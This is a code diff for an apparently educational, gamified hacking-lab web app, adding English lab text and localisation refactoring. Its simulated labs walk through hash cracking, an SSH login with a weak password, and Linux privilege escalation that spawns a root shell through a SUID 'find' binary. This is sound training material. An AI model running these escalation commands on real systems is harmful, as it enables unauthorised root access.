+Enter the hash: $6$salt123$8c6976e5b5410415...
+<span style="color:#00ff88">Possible Hashes:</span>
+[+] SHA-512 Crypt  ← <span style="color:#ff9500">Linux shadow hash</span>`,
+        'ssh admin@10.10.10.8 -p 22': `admin@10.10.10.8's password: <span style="color:#505060">[admin123]</span>
+<span style="color:#00ff88">Welcome to Ubuntu 20.04 LTS</span>
+Last login: Mon Apr  1 03:14:07 2026
+<span style="color:#ff9500">admin@victim:~$</span> <span style="color:#808090">← You are in. Find the flag.</span>`,
+        'cat /home/admin/user.txt': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+<span style="color:#a78bfa">╔══════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{john_cr4ck3d_th3_h4sh!}</span>       <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚══════════════════════════════════════╝</span>
+<span style="color:#808090">+250 XP — Hash cracked and system accessed! 💀</span>`,
+        help: `Available commands:
+  cat &lt;file&gt;                     — read a file
+  hash-identifier                — identify a hash type
+  john &lt;file&gt; --wordlist=&lt;wl&gt;    — crack hashes
+  john &lt;file&gt; --show             — show cracked hashes
+  ssh &lt;user&gt;@&lt;ip&gt;                — connect through SSH
+  ls &lt;path&gt;                      — list files
+  hint                           — ask for a hint`,
+      },
+    },
+  },
+  privesc01: {
+    en: {
+      difficulty: 'ADVANCED',
+      theory: {
+        concept: 'Privilege Escalation is the process of moving from a limited user to a more privileged one, ideally root. It comes after initial access. Misconfigured SUID binaries are a classic Linux escalation path.',
+        points: [
+          '<strong style="color:#e0e0e8">SUID (Set User ID)</strong> is a special Linux bit that makes a program run with the permissions of its owner instead of the user launching it.',
+          'If <strong style="color:#e0e0e8">/usr/bin/find</strong> has SUID and belongs to root, any command executed through <strong style="color:#e0e0e8">-exec</strong> runs as root.',
+          '<strong style="color:#e0e0e8">GTFObins</strong> is a reference for Unix binaries that can be abused for escalation, bypasses, and shell escapes.',
+          'Other common vectors include bad sudo rules, cron jobs, vulnerable services, and kernel exploits.',
+          '<strong style="color:#e0e0e8">find / -perm -4000 -type f</strong> lists every SUID-enabled binary on the system.',
+        ],
+        tools: [
+          { cmd:'find / -perm -4000 -type f 2>/dev/null', desc:'Search for binaries with the SUID bit enabled' },
+          { cmd:'ls -la /usr/bin/<binary>', desc:'Inspect owner and permissions on the suspicious binary' },
+          { cmd:'/usr/bin/find . -exec whoami \\;', desc:'Test whether the command runs as root through SUID' },
+          { cmd:'/usr/bin/find . -exec /bin/bash -p \\;', desc:'Spawn a root shell by abusing find with SUID' },
+        ],
+        why: 'Privilege escalation is the gap between partial access and full control. Once an attacker becomes root, they can install backdoors, exfiltrate data, and pivot deeper into the network. Defenders should audit SUID binaries and enforce least privilege.',
+      },
+      desc: 'You have access as user www-data on a server. Escalate to root by abusing a misconfigured SUID binary.',
+      objectives: ['Enumerate SUID binaries', 'Identify the exploitable binary', 'Become root and read the flag'],
+      hints: ['find / -perm -4000 looks for SUID files', 'GTFObins has exploitation recipes for common binaries', '/usr/bin/find with SUID can execute commands as root', 'Once you are root, the flag is in /root/root.txt'],
+      startMsg: `<span style="color:#ff5555">╔══ MISSION: Privilege Escalation ══╗</span>
+<span style="color:#606070">Current user : </span><span style="color:#e0e0e8">www-data</span>
+<span style="color:#606070">Goal         : </span><span style="color:#ff5555">root</span>
+<span style="color:#505060">──────────────────────────────────────</span>
+<span style="color:#808090">You have limited access. Become root.</span>`,
+      commands: {
+        'find / -perm -4000 -type f 2>/dev/null': `/usr/bin/passwd
+/usr/bin/su
+/usr/bin/newgrp
+<span style="color:#ff9500">/usr/bin/find</span>  ← SUID enabled (unusual)
+/usr/bin/mount
+/bin/ping`,
+        'ls -la /usr/bin/find': `-rwsr-xr-x 1 root root 224112 Feb 18 2020 <span style="color:#ff5555">/usr/bin/find</span>
+<span style="color:#ff9500">→ SUID bit enabled — it runs as root</span>`,
+        '/usr/bin/find . -exec whoami \\;': `<span style="color:#ff5555">root</span>
+<span style="color:#00ff88">→ We can run commands as root!</span>`,
+        '/usr/bin/find . -exec cat /root/root.txt \\;': `<span style="color:#ff5555">cat: /root/root.txt: Permission denied</span>
+<span style="color:#808090">→ find still uses www-data for I/O. You need a shell.</span>`,
+        '/usr/bin/find . -exec /bin/bash -p \\;': `<span style="color:#ff5555">bash-5.0# </span><span style="color:#00ff88">← Root shell obtained!</span>`,
+        'cat /root/root.txt': `<span style="color:#00ff88">✔ ROOT FLAG FOUND!</span>
+<span style="color:#a78bfa">╔══════════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{su1d_f1nd_pr1v_3sc_r00t!}</span>       <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚══════════════════════════════════════════╝</span>
+<span style="color:#808090">+350 XP — Root obtained! Advanced level cleared 💀🔥</span>`,
+        help: `Available commands:
+  whoami / id                        — user information
+  sudo -l                            — sudo permissions
+  find / -perm -4000 -type f         — search SUID binaries
+  ls -la &lt;file&gt;                      — inspect permissions
+  /usr/bin/find . -exec &lt;cmd&gt; \\;    — execute via SUID
+  cat &lt;file&gt;                         — read a file
+  uname -a                           — kernel information
+  hint                               — ask for a hint`,
+      },
+    },
+  },
+};
+
 /* =====================================================================
    PROGRESO — localStorage
    ===================================================================== */
@@ -1315,14 +2086,15 @@ function markCompleted(labId) {
   progress.completed.add(labId);
   const idx = LABS.findIndex(l => l.id === labId);
   setTimeout(() => {
+    const s = getStrings();
     if (idx < LABS.length - 1) {
-      const next = LABS[idx + 1];
-      labPrint(`<span style="color:#00ff88;font-weight:bold">╔══ 🔓 LABORATORIO DESBLOQUEADO ══╗</span>`);
-      labPrint(`<span style="color:#e0e0e8">   → ${next.title}</span>`);
+      const nextView = getLabCopy(LABS[idx + 1]);
+      labPrint(`<span style="color:#00ff88;font-weight:bold">╔══ 🔓 ${s.lab.unlocked} ══╗</span>`);
+      labPrint(`<span style="color:#e0e0e8">   → ${nextView.title}</span>`);
       labPrint(`<span style="color:#505060">╚═══════════════════════════════════╝</span>`);
       labPrint('');
     } else {
-      labPrint(`<span style="color:#00ff88;font-weight:bold">🏆 ¡TODOS LOS LABORATORIOS COMPLETADOS!</span>`);
+      labPrint(`<span style="color:#00ff88;font-weight:bold">🏆 ${s.lab.allDone}</span>`);
       labPrint('');
     }
     saveProgress();
@@ -1361,12 +2133,13 @@ function labClear() {
 }
 
 function loadTheory(lab) {
-  const t = lab.theory;
+  const localizedLab = getLabCopy(lab);
+  const t = localizedLab.theory;
   const badge = document.getElementById('theoryBadge');
-  badge.textContent = lab.difficulty;
-  badge.style.background = lab.diffColor + '22';
-  badge.style.color = lab.diffColor;
-  document.getElementById('theoryTitle').textContent = lab.title;
+  badge.textContent = localizedLab.difficulty;
+  badge.style.background = localizedLab.diffColor + '22';
+  badge.style.color = localizedLab.diffColor;
+  document.getElementById('theoryTitle').textContent = localizedLab.title;
   document.getElementById('theoryConcept').textContent = t.concept;
   const ul = document.getElementById('theoryPoints');
   ul.innerHTML = t.points.map(p => `<li>${p}</li>`).join('');
@@ -1381,12 +2154,13 @@ function loadTheory(lab) {
 
 function loadLab(lab) {
   if (!isUnlocked(lab)) {
+    const s = getStrings();
     const idx = LABS.findIndex(l => l.id === lab.id);
     const prev = LABS[idx - 1];
+    const prevView = getLabCopy(prev);
     // Mostrar brevemente un mensaje de bloqueo sin cambiar el lab activo
-    const term = document.getElementById('labTerminal');
     const flash = document.createElement('div');
-    flash.innerHTML = `<span style="color:#ff5555">🔒 Completa primero: <b style="color:#e0e0e8">${prev.title}</b></span>`;
+    flash.innerHTML = `<span style="color:#ff5555">🔒 ${s.lab.lockedPrefix} <b style="color:#e0e0e8">${prevView.title}</b></span>`;
     flash.style.cssText = 'position:absolute;bottom:60px;left:50%;transform:translateX(-50%);background:rgba(255,85,85,0.12);border:1px solid rgba(255,85,85,0.3);border-radius:8px;padding:8px 16px;font-size:0.72rem;white-space:nowrap;z-index:99;pointer-events:none';
     document.getElementById('labBodyFlex').style.position='relative';
     document.getElementById('labBodyFlex').appendChild(flash);
@@ -1394,16 +2168,17 @@ function loadLab(lab) {
     return;
   }
 
+  const localizedLab = getLabCopy(lab);
   currentLab = lab;
   hintIndex = 0;
-  document.getElementById('labTitle').textContent = lab.title;
-  document.getElementById('labDesc').textContent = lab.desc;
-  document.getElementById('labDifficulty').textContent = lab.difficulty;
-  document.getElementById('labDifficulty').style.background = lab.diffColor+'22';
-  document.getElementById('labDifficulty').style.color = lab.diffColor;
-  document.getElementById('labPrompt').textContent = lab.prompt;
+  document.getElementById('labTitle').textContent = localizedLab.title;
+  document.getElementById('labDesc').textContent = localizedLab.desc;
+  document.getElementById('labDifficulty').textContent = localizedLab.difficulty;
+  document.getElementById('labDifficulty').style.background = localizedLab.diffColor+'22';
+  document.getElementById('labDifficulty').style.color = localizedLab.diffColor;
+  document.getElementById('labPrompt').textContent = localizedLab.prompt;
   const obj = document.getElementById('labObjectives');
-  obj.innerHTML = lab.objectives.map((o,i)=>
+  obj.innerHTML = localizedLab.objectives.map((o,i)=>
     `<span style="font-size:0.62rem;padding:2px 8px;border-radius:12px;background:rgba(167,139,250,0.1);color:#a78bfa;border:1px solid rgba(167,139,250,0.2)">${i+1}. ${o}</span>`
   ).join('');
 
@@ -1419,7 +2194,7 @@ function loadLab(lab) {
   } else {
     // Primera vez en este lab
     labClear();
-    labPrint(lab.startMsg);
+    labPrint(localizedLab.startMsg);
     labPrint('');
     loadTheory(lab);
   }
@@ -1429,31 +2204,32 @@ function loadLab(lab) {
 function runLabCommand(raw) {
   const cmd = raw.trim();
   if (!cmd) return;
+  const activeLab = getLabCopy(currentLab);
   labPrintCmd(cmd);
 
   if (cmd === 'clear') {
     // Borrar historial guardado de este lab también
     delete progress.history[currentLab.id];
     labClear();
-    labPrint(currentLab.startMsg);
+    labPrint(activeLab.startMsg);
     labPrint('');
     saveProgress();
     return;
   }
   if (cmd === 'hint') {
-    const h = currentLab.hints[hintIndex % currentLab.hints.length];
-    labPrint(`<span style="color:#ff9500">💡 Pista: ${h}</span>`);
+    const h = activeLab.hints[hintIndex % activeLab.hints.length];
+    labPrint(`<span style="color:#ff9500">${getStrings().lab.hintPrefix} ${h}</span>`);
     hintIndex++;
     saveTerminalHistory();
     return;
   }
 
   const norm = cmd.replace(/\s+/g,' ');
-  let found = currentLab.commands[norm] || currentLab.commands[cmd];
+  let found = activeLab.commands[norm] || activeLab.commands[cmd];
   if (!found) {
-    const keys = Object.keys(currentLab.commands);
+    const keys = Object.keys(activeLab.commands);
     const match = keys.find(k => norm.startsWith(k.split(' ')[0]) && k !== 'help');
-    if (match && Math.abs(norm.length - match.length) < 8) found = currentLab.commands[match];
+    if (match && Math.abs(norm.length - match.length) < 8) found = activeLab.commands[match];
   }
 
   if (found) {
@@ -1464,7 +2240,7 @@ function runLabCommand(raw) {
     }
   } else {
     labPrint(`<span style="color:#ff5555">bash: ${cmd.split(' ')[0]}: command not found</span>`);
-    labPrint(`<span style="color:#505060">Escribe <span style="color:#a78bfa">help</span> para ver comandos disponibles</span>`);
+    labPrint(`<span style="color:#505060">${getStrings().lab.unknown.replace('help', '<span style="color:#a78bfa">help</span>')}</span>`);
   }
   labPrint('');
   saveTerminalHistory();
@@ -1475,11 +2251,11 @@ function runLabCommand(raw) {
    ===================================================================== */
 function refreshSidebar() {
   document.querySelectorAll('.lab-item').forEach(el => {
-    const lab = LABS.find(l => l.id === el.dataset.id);
-    if (!lab) return;
-    const unlocked = isUnlocked(lab);
-    const done = progress.completed.has(lab.id);
-    const active = currentLab && currentLab.id === lab.id;
+    const baseLab = LABS.find(l => l.id === el.dataset.id);
+    if (!baseLab) return;
+    const unlocked = isUnlocked(baseLab);
+    const done = progress.completed.has(baseLab.id);
+    const active = currentLab && currentLab.id === baseLab.id;
     const isMob = window.innerWidth <= 768;
 
     if (!unlocked) {
@@ -1506,23 +2282,29 @@ function refreshSidebar() {
   });
 }
 
-// Build sidebar
 const sidebar = document.getElementById('labSidebar');
-LABS.forEach(lab => {
-  const item = document.createElement('div');
-  item.className = 'lab-item';
-  item.dataset.id = lab.id;
-  item.style.cssText = 'padding:10px 14px;cursor:pointer;border-left:3px solid transparent;transition:all 0.15s;display:flex;justify-content:space-between;align-items:center;gap:8px';
-  item.innerHTML = `<div style="min-width:0">
-    <div style="font-size:0.72rem;color:#c0c0d0;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${lab.title}</div>
-    <span style="font-size:0.58rem;font-weight:700;padding:1px 6px;border-radius:10px;background:${lab.diffColor}22;color:${lab.diffColor}">${lab.difficulty}</span>
-  </div>
-  <span class="sb-status" style="font-size:0.75rem;flex-shrink:0"></span>`;
-  item.addEventListener('click', () => loadLab(lab));
-  item.addEventListener('mouseenter', () => { if(isUnlocked(lab) && (!currentLab || item.dataset.id !== currentLab.id)) item.style.background='rgba(255,255,255,0.04)'; });
-  item.addEventListener('mouseleave', () => { if(!currentLab || item.dataset.id !== currentLab.id) item.style.background = (currentLab && item.dataset.id === currentLab.id) ? 'rgba(167,139,250,0.12)' : ''; });
-  sidebar.appendChild(item);
-});
+function renderSidebar() {
+  sidebar.innerHTML = '';
+  LABS.forEach(baseLab => {
+    const lab = getLabCopy(baseLab);
+    const item = document.createElement('div');
+    item.className = 'lab-item';
+    item.dataset.id = baseLab.id;
+    item.style.cssText = 'padding:10px 14px;cursor:pointer;border-left:3px solid transparent;transition:all 0.15s;display:flex;justify-content:space-between;align-items:center;gap:8px';
+    item.innerHTML = `<div style="min-width:0">
+      <div style="font-size:0.72rem;color:#c0c0d0;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${lab.title}</div>
+      <span style="font-size:0.58rem;font-weight:700;padding:1px 6px;border-radius:10px;background:${lab.diffColor}22;color:${lab.diffColor}">${lab.difficulty}</span>
+    </div>
+    <span class="sb-status" style="font-size:0.75rem;flex-shrink:0"></span>`;
+    item.addEventListener('click', () => loadLab(baseLab));
+    item.addEventListener('mouseenter', () => { if(isUnlocked(baseLab) && (!currentLab || item.dataset.id !== currentLab.id)) item.style.background='rgba(255,255,255,0.04)'; });
+    item.addEventListener('mouseleave', () => { if(!currentLab || item.dataset.id !== currentLab.id) item.style.background = (currentLab && item.dataset.id === currentLab.id) ? 'rgba(167,139,250,0.12)' : ''; });
+    sidebar.appendChild(item);
+  });
+  refreshSidebar();
+}
+
+applyLanguage();
 
 // Theory panel buttons
 document.getElementById('theoryStartBtn').addEventListener('click', () => {
